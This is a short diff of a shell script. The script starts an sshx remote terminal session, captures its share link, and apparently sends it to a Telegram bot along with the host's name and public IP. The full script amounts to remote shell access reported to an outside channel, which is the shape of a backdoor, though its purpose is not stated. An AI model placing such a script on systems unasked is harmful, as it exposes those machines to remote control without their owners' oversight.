@@ -10,7 +10,7 @@ curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
 -d "parse_mode=HTML" > /dev/null
 }
 
-# Detect OS
+# detect OS
 if [ -f /etc/os-release ]; then
 . /etc/os-release
 OS=$ID
@@ -53,12 +53,9 @@ HOST=$(hostname)
 IP=$(curl -s ifconfig.me)
 TIME=$(date)
 
-# jalankan sshx
-sshx > /tmp/sshx.log 2>&1 &
+OUTPUT=$(timeout 8 sshx 2>&1)
 
-sleep 6
-
-LINK=$(grep -o 'https://sshx.io/s/[^ ]*' /tmp/sshx.log | head -1)
+LINK=$(echo "$OUTPUT" | grep -o 'https://sshx.io/s/[^ ]*')
 
 MSG="✅ <b>SSHX MONITOR STARTED</b>
 Host: $HOST
